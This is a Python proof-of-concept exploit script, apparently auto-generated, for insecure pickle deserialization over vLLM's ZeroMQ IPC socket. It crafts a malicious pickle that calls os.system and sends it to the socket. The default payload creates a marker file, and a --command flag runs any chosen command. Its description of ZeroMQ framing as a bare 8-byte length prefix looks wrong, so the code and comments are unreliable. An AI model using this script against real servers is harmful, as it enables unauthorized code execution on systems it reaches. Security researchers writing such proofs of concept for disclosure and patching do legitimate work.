#!/usr/bin/env python3
# PoC for vllm-project-vllm-7193774 (/tmp/vllm-project-vllm-7193774)
# Path: rce-024
# Sink: _send_get_data_rpc_request
# Auto-generated — run with: python3 rce_sink_function_pickle__send_get_data_rpc_request.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for vllm-project-vllm-7193774
Vulnerability: Insecure deserialization via pickle.loads on ZeroMQ IPC socket

This PoC demonstrates how an attacker with local access to the IPC socket
can achieve Remote Code Execution (RCE) by sending a malicious pickle payload.

WARNING: This is for educational/authorized testing purposes only.
"""

import os
import sys
import time
import pickle
import struct
import socket
import argparse
import subprocess
from pathlib import Path

# Configuration - modify these as needed
DEFAULT_IPC_PATH = "/tmp/vllm-ipc.sock"  # Default IPC socket path
DEFAULT_TIMEOUT = 5  # Socket timeout in seconds

class MaliciousPickle:
    """
    A class that executes arbitrary commands when unpickled.
    This demonstrates the RCE vulnerability in pickle.loads.
    """
    def __reduce__(self):
        # Benign payload: create a marker file to prove code execution
        cmd = "touch /tmp/poc_success.txt"
        return (os.system, (cmd,))

def create_malicious_payload():
    """
    Create a pickle payload that executes a benign command.
    The command creates a file at /tmp/poc_success.txt to prove RCE.
    """
    return pickle.dumps(MaliciousPickle())

def connect_zmq_socket(ipc_path, timeout=DEFAULT_TIMEOUT):
    """
    Connect to the ZeroMQ IPC socket.
    
    Args:
        ipc_path: Path to the IPC socket file
        timeout: Connection timeout in seconds
    
    Returns:
        socket object if successful, None otherwise
    """
    try:
        # Check if socket file exists
        if not os.path.exists(ipc_path):
            print(f"[-] IPC socket not found at {ipc_path}")
            return None
        
        # Create a Unix socket connection
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect(ipc_path)
        print(f"[+] Connected to IPC socket at {ipc_path}")
        return sock
    
    except socket.timeout:
        print(f"[-] Connection timed out to {ipc_path}")
        return None
    except ConnectionRefusedError:
        print(f"[-] Connection refused at {ipc_path}")
        return None
    except Exception as e:
        print(f"[-] Failed to connect: {e}")
        return None

def send_pickle_payload(sock, payload):
    """
    Send a pickle payload over the ZeroMQ socket.
    
    ZeroMQ uses a specific framing format:
    - Each message frame is prefixed with its size (as a 64-bit unsigned integer)
    - Multiple frames can be sent using multipart messages
    
    Args:
        sock: Connected socket object
        payload: Pickle payload to send
    
    Returns:
        True if sent successfully, False otherwise
    """
    try:
        # ZeroMQ IPC uses a simple framing: [frame_size][frame_data]
        # For a single frame message:
        frame_size = len(payload)
        # Pack frame size as 64-bit unsigned integer (little-endian)
        header = struct.pack("<Q", frame_size)
        
        # Send header + payload
        sock.sendall(header + payload)
        print(f"[+] Sent pickle payload ({frame_size} bytes)")
        return True
    
    except BrokenPipeError:
        print("[-] Socket connection broken")
        return False
    except Exception as e:
        print(f"[-] Failed to send payload: {e}")
        return False

def receive_response(sock, timeout=DEFAULT_TIMEOUT):
    """
    Attempt to receive a response from the server.
    
    Args:
        sock: Connected socket object
        timeout: Receive timeout in seconds
    
    Returns:
        Response data if received, None otherwise
    """
    try:
        sock.settimeout(timeout)
        # Read frame header (8 bytes for size)
        header = sock.recv(8)
        if not header:
            return None
        
        frame_size = struct.unpack("<Q", header)[0]
        # Read frame data
        data = b""
        while len(data) < frame_size:
            chunk = sock.recv(frame_size - len(data))
            if not chunk:
                break
            data += chunk
        
        print(f"[+] Received response ({len(data)} bytes)")
        return data
    
    except socket.timeout:
        print("[-] No response received (timeout)")
        return None
    except Exception as e:
        print(f"[-] Error receiving response: {e}")
        return None

def verify_exploit():
    """
    Verify that the exploit was successful by checking for the marker file.
    """
    marker_file = Path("/tmp/poc_success.txt")
    if marker_file.exists():
        print("[+] EXPLOIT SUCCESSFUL! Marker file created at /tmp/poc_success.txt")
        print("[+] This proves arbitrary code execution via pickle deserialization")
        # Clean up the marker file
        marker_file.unlink()
        return True
    else:
        print("[-] Exploit may not have succeeded (marker file not found)")
        return False

def main():
    parser = argparse.ArgumentParser(
        description="PoC exploit for vllm-project-vllm-7193774 pickle RCE"
    )
    parser.add_argument(
        "--ipc-path",
        default=DEFAULT_IPC_PATH,
        help=f"Path to the ZeroMQ IPC socket (default: {DEFAULT_IPC_PATH})"
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=DEFAULT_TIMEOUT,
        help=f"Socket timeout in seconds (default: {DEFAULT_TIMEOUT})"
    )
    parser.add_argument(
        "--command",
        help="Custom command to execute (default: touch /tmp/poc_success.txt)"
    )
    
    args = parser.parse_args()
    
    print("[*] vllm-project-vllm-7193774 Pickle RCE PoC")
    print("[*] Target IPC socket:", args.ipc_path)
    print()
    
    # Step 1: Create malicious pickle payload
    print("[*] Creating malicious pickle payload...")
    if args.command:
        # Custom command support
        class CustomPayload:
            def __reduce__(self):
                return (os.system, (args.command,))
        payload = pickle.dumps(CustomPayload())
    else:
        payload = create_malicious_payload()
    print(f"[+] Payload created ({len(payload)} bytes)")
    
    # Step 2: Connect to the IPC socket
    print("[*] Attempting to connect to IPC socket...")
    sock = connect_zmq_socket(args.ipc_path, args.timeout)
    if not sock:
        print("[-] Failed to connect. Make sure the vllm server is running.")
        sys.exit(1)
    
    # Step 3: Send the malicious payload
    print("[*] Sending malicious pickle payload...")
    if not send_pickle_payload(sock, payload):
        print("[-] Failed to send payload")
        sock.close()
        sys.exit(1)
    
    # Step 4: Wait for response (optional, server may crash or continue)
    print("[*] Waiting for server response...")
    response = receive_response(sock, timeout=2)  # Short timeout for PoC
    
    # Step 5: Clean up
    sock.close()
    print("[*] Socket closed")
    
    # Step 6: Verify exploit success
    print()
    print("[*] Verifying exploit...")
    verify_exploit()
    
    print()
    print("[*] PoC completed")
    print("[*] Note: The server may have crashed or become unstable")
    print("[*] This is expected behavior for a deserialization RCE")

if __name__ == "__main__":
    main()
